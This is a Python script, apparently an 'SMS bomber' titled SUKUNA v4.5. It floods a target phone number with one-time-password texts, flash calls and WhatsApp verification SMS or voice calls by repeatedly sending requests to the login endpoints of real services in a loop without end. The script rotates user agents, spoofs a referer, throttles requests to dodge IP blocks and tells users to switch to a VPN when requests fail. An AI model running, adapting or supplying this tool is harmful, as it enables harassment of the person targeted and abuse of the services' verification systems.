import aiohttp, asyncio, json, sys, os, random

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# هوية متصفحات متنوعة جداً لتجاوز الفشل
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

# --- تحديث الروابط (APIs) لضمان النجاح ---
CALL_APIS = [
    {"url": "https://31.171.171.90/api/phone-numbers/auth-flash-call", "data": {"phoneNumber": "{phone}"}}
]

SMS_APIS = [
    {"url": "https://app.snapp.taxi/api/api-passenger-oauth/otp/v2", "data": {"cellphone": "{phone}"}},
    {"url": "https://api.tapsi.cab/api/v2.2/credential/login", "data": {"phoneNumber": "{phone}", "role": "PASSENGER"}},
    {"url": "https://v.whatsapp.com/v2/verification", "data": {"number": "{phone}", "method": "sms"}}
]

WA_SMS_APIS = [
    {"url": "https://v.whatsapp.com/v2/verification", "data": {"number": "{phone}", "method": "sms", "language": "ar"}}
]

WA_CALL_APIS = [
    {"url": "https://v.whatsapp.com/v2/verification", "data": {"number": "{phone}", "method": "voice", "language": "ar"}}
]

def banner():
    os.system('clear')
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v4.5
    {G}King: Ali Talib (SUKUNA) | {C}Status: Anti-Block Enabled
    -------------------------------------------""")

async def attack_engine(phone, api_list, mode_name):
    ok, bad = 0, 0
    # تنظيف الرقم من علامة + إذا لزم الأمر لبعض الروابط
    clean_phone = phone.replace('+', '')
    
    async with aiohttp.ClientSession() as session:
        while True:
            api = random.choice(api_list)
            # توليد هيدرز عشوائي لكل طلب
            current_headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': "application/json",
                'Referer': "https://google.com/"
            }
            
            # محاولة الإرسال بالرقم مع + وبدونه لضمان القبول
            p_load = json.dumps(api["data"]).replace("{phone}", phone if '+' in str(api["data"]) else clean_phone)
            
            try:
                async with session.post(api["url"], data=p_load, headers=current_headers, timeout=15) as resp:
                    # إذا كان الرد 200 أو 201 أو حتى 403 أحياناً يعني الطلب وصل
                    if resp.status in [200, 201, 202]:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] {mode_name} Sent: {ok} {R}[-] Failed: {bad} {W}| {Y}IP: Shield Active")
            sys.stdout.flush()
            # زيادة الانتظار لـ 4 ثوانٍ لتجنب حظر الـ IP فوراً
            await asyncio.sleep(4)

def main():
    banner()
    if input(f"{Y}[?] Password: {W}") != "1121": return

    print(f"\n{C}[1] Calls {W}| {C}[2] SMS {W}| {G}[3] WA-SMS {W}| {G}[4] WA-Voice")
    choice = input(f"\n{Y}[#] Select Mode: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")

    modes = {'1': (CALL_APIS, "CALL"), '2': (SMS_APIS, "SMS"), '3': (WA_SMS_APIS, "WA-SMS"), '4': (WA_CALL_APIS, "WA-Voice")}

    if choice in modes:
        print(f"\n{R}[!] Attacking... (If all fail, use a VPN!){W}")
        try:
            asyncio.run(attack_engine(target, modes[choice][0], modes[choice][1]))
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped.")

if __name__ == "__main__":
    main()
